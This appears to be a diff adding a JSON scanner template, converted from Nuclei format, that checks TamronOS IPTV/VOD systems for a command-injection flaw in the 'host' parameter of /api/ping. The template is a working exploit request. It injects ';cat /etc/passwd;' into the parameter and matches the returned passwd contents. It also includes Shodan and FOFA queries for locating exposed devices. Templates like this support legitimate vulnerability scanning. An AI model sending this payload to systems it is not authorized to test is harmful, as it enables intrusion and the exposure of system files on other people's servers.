@@ -1,0 +1,148 @@
+{
+  "id": "tamronos-rce",
+  "name": "TamronOS IPTV/VOD - Remote Command Execution",
+  "author": "pikpikcu",
+  "severity": "CRITICAL",
+  "description": "TamronOS IPTV/VOD contains a remote command execution in the \u0027host\u0027 parameter of the /api/ping endpoint.\n",
+  "references": [
+    "https://twitter.com/sec715/status/1405336456923471874"
+  ],
+  "tags": [
+    "tamronos",
+    "rce"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "fofa": "title\u003d\"TamronOS IPTV系统\"",
+    "shodan": "title:\"TamronOS IPTV系统\""
+  },
+  "variables": {},
+  "variablesType": "sniper",
+  "cweId": "CWE-78",
+  "cvssScore": "10",
+  "cvssMetrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}/api/ping?count\u003d5\u0026host\u003d;cat%20/etc/passwd;\u0026port\u003d80\u0026source\u003d1.1.1.1\u0026type\u003dicmp",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "REGEX",
+          "part": "body",
+          "values": [
+            "root:.*:0:0:"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "internal": "true",
+          "group": 1
+        },
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "tamronos-rce",
+    "info": {
+      "name": "TamronOS IPTV/VOD - Remote Command Execution",
+      "author": "pikpikcu",
+      "severity": "critical",
+      "description": "TamronOS IPTV/VOD contains a remote command execution in the \u0027host\u0027 parameter of the /api/ping endpoint.\n",
+      "reference": [
+        "https://twitter.com/sec715/status/1405336456923471874"
+      ],
+      "classification": {
+        "cvss_metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+        "cvss_score": "10",
+        "cwe_id": "CWE-78"
+      },
+      "metadata": {
+        "max_request": 1,
+        "shodan_query": "title:\"TamronOS IPTV系统\"",
+        "fofa_query": "title\u003d\"TamronOS IPTV系统\""
+      },
+      "tags": "tamronos,rce"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}/api/ping?count\u003d5\u0026host\u003d;cat%20/etc/passwd;\u0026port\u003d80\u0026source\u003d1.1.1.1\u0026type\u003dicmp"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "regex",
+            "part": "body",
+            "regex": [
+              "root:.*:0:0:"
+            ],
+            "group": 1,
+            "internal": true
+          },
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
